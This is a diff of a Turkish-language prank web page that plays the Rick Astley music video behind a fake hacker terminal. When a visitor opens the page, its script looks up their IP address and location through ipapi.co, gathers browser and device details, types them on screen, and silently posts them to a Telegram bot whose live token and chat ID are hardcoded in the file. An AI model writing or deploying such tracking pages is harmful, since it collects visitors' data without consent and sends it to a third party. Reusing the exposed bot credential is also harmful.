@@ -4,47 +4,68 @@
   <meta charset="UTF-8" />
   <title>Rick And Roll</title>
   <style>
-    html, body {
-      margin: 0; padding: 0; height: 100vh; width: 100vw; overflow: hidden;
-      background: #fff;
+    /* Tam ekran video arka plan */
+    body, html {
+      margin: 0; padding: 0; height: 100%; overflow: hidden;
       font-family: 'Consolas', monospace;
+      background: black;
       color: #00ff99;
-      user-select: none;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
     }
-    #video-bg {
+    video#bgVideo {
       position: fixed;
       top: 0; left: 0;
-      width: 100vw; height: 100vh;
+      width: 100vw;
+      height: 100vh;
       object-fit: cover;
       z-index: -1;
-      filter: brightness(1.1);
+      filter: brightness(0.5);
     }
     #terminal {
-      position: relative;
-      margin: 20px auto;
-      max-width: 700px;
       background: rgba(0, 0, 0, 0.7);
       border: 2px solid #00ff99;
       border-radius: 12px;
       padding: 30px 40px;
-      white-space: pre-line;
-      box-shadow: 0 0 15px #00ff99;
-      font-size: 18px;
+      width: 90%;
+      max-width: 700px;
       min-height: 300px;
       overflow-y: auto;
+      white-space: pre-line;
+      box-shadow: 0 0 15px #00ff99;
       z-index: 10;
+      position: relative;
     }
   </style>
 </head>
 <body>
-  <video id="video-bg" autoplay loop muted playsinline>
-    <source src="https://dl.dropboxusercontent.com/s/3ylpz1z5fhmp9mcwesd4k/Rick-Astley-Never-Gonna-Give-You-Up-Official-Music-Video.mp4" type="video/mp4">
+  <video id="bgVideo" autoplay muted loop playsinline>
+    <source src="https://dl.dropboxusercontent.com/s/3ylpz1z5fhmp9mcwesd4k/Rick-Astley-Never-Gonna-Give-You-Up-Official-Music-Video.mp4" type="video/mp4" />
     Tarayıcınız video etiketini desteklemiyor.
   </video>
 
   <div id="terminal">Veriler Toplanıyor...</div>
 
   <script>
+    const terminal = document.getElementById('terminal');
+
+    function typeText(text, delay = 40) {
+      return new Promise(resolve => {
+        let i = 0;
+        const interval = setInterval(() => {
+          terminal.innerText += text.charAt(i);
+          i++;
+          if (i >= text.length) {
+            clearInterval(interval);
+            terminal.innerText += "\n";
+            resolve();
+          }
+        }, delay);
+      });
+    }
+
     async function sendToTelegram(message) {
       const chatId = "6400737507"; // Senin chat ID'in
       const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
@@ -60,32 +81,36 @@
           })
         });
       } catch(e) {
-        // Hata varsa sessizce geç
+        // Hata sessizce geç
       }
     }
 
     async function collectData() {
-      const terminal = document.getElementById('terminal');
+      terminal.innerText = "";
+      await typeText("Veriler Toplanıyor...");
+
+      await new Promise(r => setTimeout(r, 1200));
+
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
 
-        const message = `Gizli Veri:\n` +
-          `IP: ${data.ip}\n` +
-          `Şehir: ${data.city}\n` +
-          `Ülke: ${data.country_name}\n` +
-          `Tarayıcı: ${navigator.userAgent}\n` +
-          `Çözünürlük: ${screen.width}x${screen.height}\n` +
-          `Dil: ${navigator.language}\n` +
-          `Platform: ${navigator.platform}\n` +
-          `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
-          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
-          `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
+        await typeText(`IP Adresi: ${data.ip}`);
+        await typeText(`Şehir: ${data.city}`);
+        await typeText(`Ülke: ${data.country_name}`);
+        await typeText(`Tarayıcı: ${navigator.userAgent}`);
+        await typeText(`Ekran Çözünürlüğü: ${screen.width}x${screen.height}`);
+        await typeText(`Dil: ${navigator.language || 'Bilinmiyor'}`);
+        await typeText(`Platform: ${navigator.platform || 'Bilinmiyor'}`);
+        await typeText(`Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}`);
+        await typeText(`Çerez İzinleri: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}`);
+        await typeText(`Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`);
 
-        terminal.innerText = message.replace(/\n/g, '\n');
+        const message = `YENİ GİRİŞ:\nIP: ${data.ip}\nŞehir: ${data.city}\nÜlke: ${data.country_name}\nTarayıcı: ${navigator.userAgent}\nÇözünürlük: ${screen.width}x${screen.height}\nDil: ${navigator.language}\nPlatform: ${navigator.platform}\nZaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\nÇerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\nBağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
+
         await sendToTelegram(message);
-      } catch(e) {
-        terminal.innerText = "Veri alınırken bir hata oluştu.";
+      } catch (e) {
+        await typeText("Veri alınırken bir hata oluştu.");
       }
     }
 
